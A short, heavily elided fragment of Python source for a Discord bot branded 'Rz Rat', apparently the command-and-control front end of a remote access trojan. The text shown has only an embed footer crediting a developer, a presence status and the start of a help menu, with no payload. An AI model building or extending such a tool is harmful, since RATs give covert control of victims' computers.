...
def WinMsg(Name, Value):
    ...
    embed.set_footer(text = "Rz Rat Developer : ! ♰ ᲼᲼᲼᲼᲼᲼᲼᲼᲼001ᴿᶻ#4612")
    return embed
...
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Rz Rat"))
...
@client.command()
async def menu(ctx):
    embed = discord.Embed(title = "Rz Help Menu", color=0xFC4D4D)
